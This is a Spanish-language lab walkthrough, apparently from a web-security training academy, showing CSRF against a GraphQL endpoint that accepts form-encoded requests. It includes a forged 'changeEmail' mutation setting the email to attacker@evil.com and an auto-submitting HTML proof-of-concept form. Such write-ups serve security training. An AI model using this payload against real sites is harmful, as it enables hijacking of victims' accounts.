# 💻 Explotación CSRF a través de GraphQL

## 📄 Descripción del laboratorio

Este laboratorio presenta una vulnerabilidad de **Cross-Site Request Forgery (CSRF)** en un endpoint GraphQL.

El endpoint acepta peticiones con el tipo de contenido `application/x-www-form-urlencoded`, lo que permite construir una solicitud compatible con un formulario HTML tradicional.

🎯 **Objetivo del laboratorio:**

* Cambiar el email de la víctima
* Forjar una mutación GraphQL
* Entregar el exploit mediante el **Exploit Server**



## 📚 Teoría

GraphQL suele utilizar peticiones `POST` con contenido JSON. Sin embargo, si el backend está mal configurado, puede aceptar otros tipos de contenido.

En este laboratorio el endpoint presenta varios problemas:

```
Acepta application/x-www-form-urlencoded
No valida token CSRF
No verifica cabeceras Origin o Referer
Confía únicamente en la cookie de sesión
```

Esto permite construir un **formulario HTML malicioso** que envíe una mutación GraphQL.

Cuando la víctima visita la página maliciosa:

* El navegador envía automáticamente la **cookie de sesión**
* El backend procesa la petición como autenticada
* La mutación GraphQL se ejecuta

Esto demuestra que **GraphQL no es inmune a CSRF** si acepta formatos compatibles con formularios HTML.

### 2️⃣ Capturar la mutación GraphQL

Cambiamos el email normalmente e interceptamos la petición GraphQL con **Burp Suite**.

### 3️⃣ Cambiar el tipo de contenido

El endpoint acepta `application/x-www-form-urlencoded`.

En **Burp Repeater**:

* Cambiamos el método de la petición si es necesario
* Ajustamos el header:

```http
Content-Type: application/x-www-form-urlencoded
```

<img width="768" height="387" alt="image" src="https://github.com/user-attachments/assets/4ae6ecda-68d3-4a9b-bd53-2a8d2e202a05" />

El backend ahora espera que la mutación se envíe como parámetro de formulario.



### 4️⃣ Adaptar la mutación al formato form

La mutación se envía dentro del parámetro `query`.

Ejemplo:

```graphql
query=mutation { changeEmail(email:"attacker@evil.com") { email } }
```

Enviamos la petición.

<img width="768" height="309" alt="image" src="https://github.com/user-attachments/assets/9b7d9823-17ce-46fb-8b12-f8e6a0f5680e" />

El servidor procesa correctamente la mutación, confirmando que el endpoint es **vulnerable a CSRF**.



### 5️⃣ Generar el CSRF PoC

Desde **Burp Repeater**:

```
Engagement tools → Generate CSRF PoC
```

Burp genera un HTML similar a:

```hlsl
<html>
  <body>
    <form action="https://ID-LAB.web-security-academy.net/graphql" method="POST">
      <input type="hidden" name="query" value='mutation { changeEmail(email:"attacker@evil.com") { email } }'>
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
